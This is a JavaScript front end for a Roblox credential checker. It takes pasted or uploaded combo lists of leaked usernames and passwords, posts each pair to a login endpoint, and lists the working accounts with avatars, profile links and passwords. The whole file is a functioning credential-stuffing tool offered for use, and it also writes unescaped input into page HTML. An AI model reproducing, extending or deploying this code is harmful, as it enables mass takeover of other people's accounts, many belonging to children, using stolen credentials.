let app = document.getElementById('app');
let userName = localStorage.getItem('username') || null;
let format = { site: -1, username: -1, password: -1 };
let parsedLines = [];
let checkingIndex = 0;
let validAccounts = [];
let invalidAccounts = [];

function renderNameScreen() {
  app.innerHTML = `
    <div class="name-screen">
      <h1>Enter your name...</h1>
      <input id="nameInput" placeholder="Enter your name..." autocomplete="off" autofocus>
      <button onclick="saveName()">Continue</button>
    </div>
  `;

  document.getElementById('nameInput').addEventListener('keydown', e => {
    if (e.key === 'Enter') saveName();
  });
}

function saveName() {
  const name = document.getElementById('nameInput').value.trim();
  if (name) {
    localStorage.setItem('username', name);
    userName = name;
    renderMainScreen();
  }
}

function renderMainScreen() {
  app.innerHTML = `
    <div class="main-screen">
      <h1>Hello, <span class="green">${userName}</span></h1>

      <textarea id="credInput" rows="8" cols="50" placeholder="Paste your credentials here..."></textarea><br>
      <input type="file" id="fileInput"><br>
      <button onclick="previewData()">Preview & Assign Format</button>

      <div id="previewArea"></div>
      <div id="siteSelect" class="hidden">
        <h2>Site: <img src="https://cdn.worldvectorlogo.com/logos/roblox.svg" style="width:20px;vertical-align:middle;"> Roblox</h2>
        <button onclick="startValidation()">Validate Credentials</button>
      </div>

      <div id="progress" class="progress">Checked 0 / 0 accounts</div>
      <div id="results"></div>
    </div>
  `;
}

function previewData() {
  let input = document.getElementById('credInput').value.trim();
  const file = document.getElementById('fileInput').files[0];

  if (file) {
    const reader = new FileReader();
    reader.onload = e => {
      input = e.target.result;
      processPreview(input);
    };
    reader.readAsText(file);
  } else {
    processPreview(input);
  }
}

function processPreview(data) {
  parsedLines = data.split('\n').filter(line => line.trim() !== '');
  if (parsedLines.length === 0) return alert('No valid lines found.');

  const delimiter = parsedLines[0].includes(':') ? ':' :
                    parsedLines[0].includes(',') ? ',' :
                    parsedLines[0].includes('|') ? '|' : null;

  if (!delimiter) return alert('No recognizable delimiter found (try : , or |)');

  // Show first line tokens and let user assign
  const firstTokens = parsedLines[0].split(delimiter);

  let previewHTML = `<h2>Assign Format:</h2><div class="preview-line">`;
  firstTokens.forEach((token, idx) => {
    previewHTML += `
      <div style="display:inline-block; margin:5px;">
        <div class="token">${token}</div>
        <select onchange="setFormat(${idx}, this.value)">
          <option value="">None</option>
          <option value="site">Site</option>
          <option value="username">Username</option>
          <option value="password">Password</option>
        </select>
      </div>
    `;
  });
  previewHTML += `</div>`;

  previewHTML += `<pre style="margin-top:1rem; text-align:left;">${parsedLines.slice(0,3).join('\n')}</pre>`;

  document.getElementById('previewArea').innerHTML = previewHTML;
  document.getElementById('siteSelect').classList.remove('hidden');
}

function setFormat(index, role) {
  // Remove duplicates
  for (const key in format) {
    if (format[key] === index) format[key] = -1;
  }
  if (role) format[role] = index;
}

async function startValidation() {
  if (format.username === -1 || format.password === -1) {
    return alert('Please assign Username and Password fields before validation.');
  }

  validAccounts = [];
  invalidAccounts = [];
  checkingIndex = 0;

  document.getElementById('results').innerHTML = '';
  updateProgress();

  // Validate accounts one by one
  for (let i = 0; i < parsedLines.length; i++) {
    const delimiter = parsedLines[0].includes(':') ? ':' :
                      parsedLines[0].includes(',') ? ',' :
                      '|';

    const parts = parsedLines[i].split(delimiter);
    const username = parts[format.username]?.trim();
    const password = parts[format.password]?.trim();

    if (!username || !password) continue;

    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });
      const data = await res.json();

      if (data.valid) {
        validAccounts.push({
          username: data.username || username,
          userId: data.userId || 0,
          password,
          message: data.message || 'Valid username found. Password not verified.'
        });
      } else {
        invalidAccounts.push({ username, password });
      }
    } catch (err) {
      invalidAccounts.push({ username, password });
    }

    checkingIndex++;
    updateProgress();
  }

  renderResults();
}

function updateProgress() {
  const total = parsedLines.length;
  document.getElementById('progress').textContent = `Checked ${checkingIndex} / ${total} accounts`;
}

function renderResults() {
  let html = `<h2>✅ Valid Accounts</h2>`;
  if (validAccounts.length === 0) html += `<p>None found.</p>`;
  validAccounts.forEach(user => {
    html += `
      <div class="result-card">
        <img src="https://www.roblox.com/headshot-thumbnail/image?userId=${user.userId}&width=150&height=150&format=png" alt="Avatar">
        <div>
          <a href="https://www.roblox.com/users/${user.userId}/profile" target="_blank" class="profile-link green">${user.username}</a><br>
          <span class="password" title="Click to toggle visibility" onclick="this.classList.toggle('visible')">${user.password}</span><br>
          <small>${user.message}</small>
        </div>
      </div>
    `;
  });

  html += `<h2>❌ Invalid Accounts</h2>`;
  if (invalidAccounts.length === 0) html += `<p>None found.</p>`;
  invalidAccounts.forEach(user => {
    html += `
      <div class="result-card">
        <img src="https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png" alt="No avatar">
        <div>
          <span class="profile-link red">${user.username}</span><br>
          <span class="password" title="Click to toggle visibility" onclick="this.classList.toggle('visible')">${user.password}</span>
        </div>
      </div>
    `;
  });

  document.getElementById('results').innerHTML = html;
}

// Init
userName ? renderMainScreen() : renderNameScreen();
